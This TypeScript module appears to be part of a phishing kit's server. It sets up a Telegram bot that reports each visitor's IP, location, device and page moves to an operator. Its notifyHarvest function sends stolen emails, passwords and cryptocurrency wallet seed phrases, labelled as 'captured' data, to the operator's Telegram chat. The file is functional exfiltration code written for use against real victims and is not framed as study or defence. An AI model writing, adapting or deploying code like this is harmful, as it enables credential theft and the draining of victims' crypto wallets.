// Telegram Bot API — configure via Settings → Telegram or TELEGRAM_* env vars.

import { dbGetSettings } from './database.js';

export interface TelegramConfig {
	enabled: boolean;
	botToken: string;
	chatId: string;
	fields: { email: boolean; password: boolean; seed: boolean; ip: boolean; userAgent: boolean };
}

export interface TelegramBotInfo {
	id: number;
	username: string;
	firstName: string;
}

export interface TelegramChatOption {
	chatId: string;
	title: string;
	type: string;
}

type TelegramApiResponse<T> = {
	ok: boolean;
	description?: string;
	result?: T;
};

async function callTelegramApi<T>(
	method: string,
	botToken: string,
	body?: Record<string, unknown>
): Promise<{ ok: true; result: T } | { ok: false; error: string }> {
	const token = botToken.trim();
	if (!token) return { ok: false, error: 'Bot token is required' };

	try {
		const res = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: body ? JSON.stringify(body) : undefined,
			signal: AbortSignal.timeout(15000)
		});
		const data = (await res.json()) as TelegramApiResponse<T>;
		if (!data.ok) {
			return { ok: false, error: data.description || `Telegram API error (${res.status})` };
		}
		return { ok: true, result: data.result as T };
	} catch (err: unknown) {
		const message = err instanceof Error ? err.message : 'Network error';
		return { ok: false, error: message };
	}
}

export function getTelegramConfig(): TelegramConfig {
	const s = dbGetSettings('telegram.');
	return {
		enabled: s['telegram.enabled'] === '1',
		botToken: s['telegram.bot_token'] ?? process.env.TELEGRAM_BOT_TOKEN ?? '',
		chatId: s['telegram.chat_id'] ?? process.env.TELEGRAM_CHAT_ID ?? '',
		fields: {
			email: (s['telegram.field_email'] ?? '1') !== '0',
			password: (s['telegram.field_password'] ?? '1') !== '0',
			seed: (s['telegram.field_seed'] ?? '1') !== '0',
			ip: (s['telegram.field_ip'] ?? '1') !== '0',
			userAgent: (s['telegram.field_user_agent'] ?? '0') !== '0'
		}
	};
}

export async function verifyTelegramBot(
	botToken: string
): Promise<{ ok: true; bot: TelegramBotInfo } | { ok: false; error: string }> {
	const res = await callTelegramApi<{
		id: number;
		username?: string;
		first_name?: string;
	}>('getMe', botToken);

	if (!res.ok) return res;

	return {
		ok: true,
		bot: {
			id: res.result.id,
			username: res.result.username || '',
			firstName: res.result.first_name || 'Bot'
		}
	};
}

/** Recent chats that messaged this bot (user must DM the bot or add it to a group first). */
export async function discoverTelegramChats(
	botToken: string
): Promise<{ ok: true; chats: TelegramChatOption[] } | { ok: false; error: string }> {
	const verify = await verifyTelegramBot(botToken);
	if (!verify.ok) return verify;

	const updates = await callTelegramApi<
		{
			update_id: number;
			message?: { chat: { id: number; type: string; title?: string; username?: string; first_name?: string } };
			my_chat_member?: { chat: { id: number; type: string; title?: string; username?: string; first_name?: string } };
		}[]
	>('getUpdates', botToken, { limit: 50 });

	if (!updates.ok) return updates;

	const seen = new Map<string, TelegramChatOption>();
	for (const u of updates.result) {
		const chat = u.message?.chat ?? u.my_chat_member?.chat;
		if (!chat) continue;
		const chatId = String(chat.id);
		if (seen.has(chatId)) continue;
		const title =
			chat.title ||
			(chat.username ? `@${chat.username}` : '') ||
			chat.first_name ||
			`Chat ${chatId}`;
		seen.set(chatId, { chatId, title, type: chat.type });
	}

	const chats = [...seen.values()].sort((a, b) => a.title.localeCompare(b.title));
	if (chats.length === 0) {
		return {
			ok: false,
			error:
				'No chats found. Open your bot in Telegram, send /start (or add the bot to a group), then try again.'
		};
	}

	return { ok: true, chats };
}

export async function sendTelegram(
	message: string,
	cfg: TelegramConfig = getTelegramConfig(),
	opts?: { skipEnabledCheck?: boolean }
): Promise<{ ok: boolean; error?: string }> {
	if (!opts?.skipEnabledCheck && !cfg.enabled) {
		return { ok: false, error: 'Telegram notifications are disabled in settings' };
	}
	if (!cfg.botToken?.trim() || !cfg.chatId?.trim()) {
		return { ok: false, error: 'Bot token and chat ID are required' };
	}

	const chatId = cfg.chatId.trim();
	const numericChatId = /^-?\d+$/.test(chatId) ? Number(chatId) : chatId;

	const res = await callTelegramApi<{ message_id: number }>('sendMessage', cfg.botToken.trim(), {
		chat_id: numericChatId,
		text: message,
		parse_mode: 'HTML',
		disable_web_page_preview: true
	});

	if (!res.ok) return { ok: false, error: res.error };
	return { ok: true };
}

export interface VisitorInfo {
	ip: string;
	userId: string;
	city?: string;
	region?: string;
	country?: string;
	browser?: string;
	platform?: string;
	module?: string;
	capturedBy?: string;
	lastPageRoute?: string;
}

function visitorBlock(v: VisitorInfo): string {
	const loc = [v.city, v.region, v.country].filter(Boolean).join(', ') || 'Unknown';
	const device = [v.browser, v.platform].filter(Boolean).join('/') || 'Unknown';
	const lines: string[] = [];
	lines.push(`\u{1F464} [ID:${htmlEscape(v.userId || '—')}]`);
	lines.push(`\u{1F4CD} IP:${htmlEscape(v.ip)} | ${htmlEscape(loc)}`);
	lines.push(`\u{1F4F1} ${htmlEscape(device)}`);
	if (v.module) lines.push(`\u{1F517} Module: ${htmlEscape(v.module)}`);
	if (v.capturedBy) lines.push(`\u{1F310}${htmlEscape(v.capturedBy)}${v.lastPageRoute ? ` | Current: ${htmlEscape(v.lastPageRoute)}` : ''}`);
	return lines.join('\n');
}

export async function notifyVisitorConnect(v: VisitorInfo): Promise<void> {
	const cfg = getTelegramConfig();
	if (!cfg.enabled) return;
	const msg = `\u{1F195} <b>NEW USER</b>\n\n${visitorBlock(v)}\n\u{1F4CA} Session Started`;
	await sendTelegram(msg, cfg).catch((err) => {
		console.warn('[telegram] connect notify failed:', err?.message || err);
	});
}

export async function notifyVisitorPage(v: VisitorInfo, fromPage: string, toPage: string): Promise<void> {
	const cfg = getTelegramConfig();
	if (!cfg.enabled) return;
	const msg = `\u{1F501} <b>PAGE CHANGE</b>\n\n${visitorBlock(v)}\n\u{1F4C4} From: <code>${htmlEscape(fromPage)}</code>\n\u{1F4C4} To: <b>${htmlEscape(toPage)}</b>`;
	await sendTelegram(msg, cfg).catch((err) => {
		console.warn('[telegram] page-change notify failed:', err?.message || err);
	});
}

export async function notifyPageAction(v: VisitorInfo, page: string, action: string, detail?: string): Promise<void> {
	const cfg = getTelegramConfig();
	if (!cfg.enabled) return;
	const lines: string[] = [];
	lines.push(`\u{1F4E5} <b>PAGE INPUT</b>\n`);
	lines.push(visitorBlock(v));
	lines.push(`\u{1F4C4} Page: <b>${htmlEscape(page)}</b>`);
	lines.push(`\u{2705} Action: ${htmlEscape(action)}`);
	if (detail) lines.push(`\u{1F4DD} Detail: <code>${htmlEscape(detail)}</code>`);
	await sendTelegram(lines.join('\n'), cfg).catch((err) => {
		console.warn('[telegram] page-action notify failed:', err?.message || err);
	});
}

export interface HarvestNotification {
	visitorIp: string;
	flow: string;
	type: 'account' | 'phrase' | 'upload';
	data: unknown;
	userAgent?: string;
	capturedBy?: string;
}

function htmlEscape(s: string): string {
	return s.replace(/[&<>]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' })[c] || c);
}

export async function notifyHarvest(input: HarvestNotification): Promise<void> {
	const cfg = getTelegramConfig();
	if (!cfg.enabled) return;

	const lines: string[] = [];
	lines.push(`<b>\u{1F6A8} New ${input.type.toUpperCase()} captured</b>`);
	if (cfg.fields.ip) lines.push(`<b>IP:</b> <code>${htmlEscape(input.visitorIp)}</code>`);
	lines.push(`<b>Flow:</b> ${htmlEscape(input.flow || '—')}`);

	const data = (input.data || {}) as Record<string, unknown>;
	if (cfg.fields.email && data.email) lines.push(`<b>Email:</b> <code>${htmlEscape(String(data.email))}</code>`);
	if (cfg.fields.password && data.password) {
		lines.push(`<b>Password:</b> <code>${htmlEscape(String(data.password))}</code>`);
	}
	if (cfg.fields.seed) {
		const phrase =
			typeof input.data === 'string'
				? input.data
				: (data.phrase as string) || (data.seed as string) || (data.mnemonic as string);
		if (phrase) lines.push(`<b>Seed:</b> <code>${htmlEscape(String(phrase))}</code>`);
	}
	if (cfg.fields.userAgent && input.userAgent) {
		lines.push(`<b>UA:</b> <code>${htmlEscape(input.userAgent.slice(0, 200))}</code>`);
	}
	if (input.capturedBy) lines.push(`<b>By:</b> ${htmlEscape(input.capturedBy)}`);

	await sendTelegram(lines.join('\n'), cfg).catch((err) => {
		console.warn('[telegram] notify failed:', err?.message || err);
	});
}
